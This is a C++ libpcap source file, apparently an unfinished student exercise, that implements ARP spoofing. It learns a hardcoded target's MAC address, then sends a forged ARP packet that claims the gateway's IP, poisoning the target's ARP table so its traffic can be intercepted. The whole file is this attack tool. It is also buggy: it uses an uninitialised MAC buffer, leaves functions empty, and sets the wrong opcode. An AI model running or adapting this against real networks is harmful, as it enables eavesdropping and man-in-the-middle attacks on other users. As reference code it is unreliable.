#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

// 기존의 libnet_arp_hdr 구조체를 사용
struct ExtendedArpHdr :public libnet_arp_hdr{
    uint8_t ar_sha[ETHER_ADDR_LEN];        // Sender hardware address
    uint8_t ar_sip[4];      // Sender protocol address
	//in_addr ar_sip;
    uint8_t ar_tha[ETHER_ADDR_LEN];        // Target hardware address
    uint8_t ar_tip[4];       // Target protocol address
	//in_addr ar_tip;
	// bool cmp_sip(struct in_addr other_ip){
	// 	//
	// }
};
struct PacketDatas{
	uint8_t eth_targer_mac[6];
	uint8_t eth_sender_mac[6];

	in_addr arp_sender_ip;
	uint8_t arp_sender_mac[6]; 
	in_addr arp_target_ip;	
	uint8_t arp_target_mac[6];
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void find_sender_mac(const char* dev, uint8_t sender_mac[]) {
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {
        perror("socket");
        return;
    }

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        // MAC 주소를 sender_mac 배열에 저장
        for (int i = 0; i < 6; ++i) {
            sender_mac[i] = (uint8_t) s.ifr_addr.sa_data[i];
        }
    } else {
        perror("ioctl");
    }

    close(fd);
}

void find_gateway_ip(char* dev, struct in_addr *gateway_ip){
	FILE* fp=NULL;
	char buff[100];
	uint8_t* temp_gateway_ip[4];
	fp = fopen("/proc/net/route", "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }
	while(fgets(buff, sizeof(buff), fp)!=0){
		char current_iface[16], destination[16], gateway[16];
        sscanf(buff, "%s %s %s", current_iface, destination, gateway);

        // Iface'wlan0' && Destination =='00000000'
        if (strcmp(current_iface, dev) == 0 && strcmp(destination, "00000000") == 0) {
			unsigned long gateway_addr = strtoul(gateway, NULL, 16);
            gateway_ip->s_addr = gateway_addr;
            break;  // 
        }
	}
	fclose(fp);
}
void make_send_packet(EthArpPacket &packet_send, in_addr sender_ip, in_addr target_ip, uint8_t *eth_sender_mac, uint8_t *eth_targer_mac, uint8_t *arp_sender_mac, uint8_t *arp_target_mac){

}

void make_send_packet(EthArpPacket &packet_send, in_addr sender_ip, in_addr target_ip, uint8_t *sender_mac){
	//char* new_target_mac;
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
	packet_send.arp_.op_ = htons(ArpHdr::Request);
	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;

	packet_send.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//i dont know
	packet_send.eth_.smac_ = Mac(sender_mac);//sender macc

	packet_send.arp_.smac_ = Mac(sender_mac); //sender mac
	packet_send.arp_.sip_ = htonl(Ip(inet_ntoa(sender_ip))); //sender IP
	packet_send.arp_.tmac_ = Mac("00:00:00:00:00:00"); //i dont know
	packet_send.arp_.tip_ = htonl(Ip(inet_ntoa(target_ip)));//target IP
}



void change_target_arp_table(
		EthArpPacket &packet_send, 
		in_addr gateway_ip, 
		uint8_t *sender_mac
	){
	packet_send.arp_.smac_ = Mac(sender_mac); //sender mac
	packet_send.arp_.sip_ = htonl(Ip(inet_ntoa(gateway_ip))); //gateway IP
}

void print_mac_address(const uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) {
        printf("%02x", mac[i]);
        if (i < 5) {
            printf(":");
        }
    }
    printf("\n");
}

uint8_t* get_mac_address(uint8_t *my_mac){

}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}
	struct PacketDatas pkDatas;
	
	char* dev = argv[1];
	//char* sender_ip = argv[2];
	//char* target_ip = argv[3];
	//printf("sender_ip: %s, target_ip: %s\n", argv[2], argv[3]);
	
	
	const char* sender_ip_str="192.168.182.110";
	const char* target_ip_str="192.168.182.183";

	struct in_addr sender_ip, target_ip, gateway_ip;
	inet_pton(AF_INET, sender_ip_str, &sender_ip);
	inet_pton(AF_INET, target_ip_str, &target_ip);
	printf("Sender IP Address: %s\n", inet_ntoa(sender_ip));
	find_gateway_ip(dev, &gateway_ip);
	printf("Gateway IP Address: %s\n", inet_ntoa(gateway_ip));

	uint8_t my_mac[6], sender_mac[6], target_mac[6];
	//char sender_mac[18] = {0};
	find_sender_mac(dev, my_mac);

	//char target_mac[18] = {0};
	
	int flag_send=1;
	//flag_send
	//1: find target mac
	//2: find gateway ip
	//3: find gateway mac
	//4: send arp table attack
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet_send;
	struct pcap_pkthdr* header;
	int res;
	const u_char* packet_receive;
	uint8_t new_mac_addr[6];

	while (1) {
		if(flag_send){
			if(flag_send==1){
				printf("request target's MAC\n");
				make_send_packet(packet_send, sender_ip, target_ip, sender_mac);
			}
			else if(flag_send==2){
				printf("Attack!!\n");
				change_target_arp_table(packet_send, gateway_ip, sender_mac);
			}
			//change_target_arp_table(packet_send, gateway_ip, sender_mac, target_mac);
	
			//*new_mac_addr=get_mac_address(my_mac);
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
			if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			flag_send=0;
		}

		
		res = pcap_next_ex(handle, &header, &packet_receive);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		//printf("arp hdr size: %d\n", sizeof(struct libnet_arp_hdr));//8

		printf("%u bytes captured\n", header->caplen);
		
		struct libnet_ethernet_hdr* ethernet_hdr = (struct libnet_ethernet_hdr*)packet_receive;
		
		    //ether_type=ARP 
        if (ntohs(ethernet_hdr->ether_type) == 0x806) {
            //struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));
            struct ExtendedArpHdr* arp_hdr = (struct ExtendedArpHdr*)(packet_receive+ sizeof(struct libnet_ethernet_hdr));

            if ((ntohs(arp_hdr->ar_op) ==2)) {//check ip too//&&(arp_hdr->ar_sip==sender_ip)
				//uint8_t *reply_sender_mac = arp_hdr->ar_sha;
				//target_mac=arp_hdr->ar_sha;
				memcpy(target_mac, arp_hdr->ar_sha, sizeof(target_mac));
				//format_mac_address(reply_sender_mac, target_mac);
				printf("Target MAC Address: ");
    			print_mac_address(target_mac);
				flag_send=2;
            }
		}
	}

	// pcap_close(handle_send);
	// pcap_close(handle_receive);
	pcap_close(handle);
}
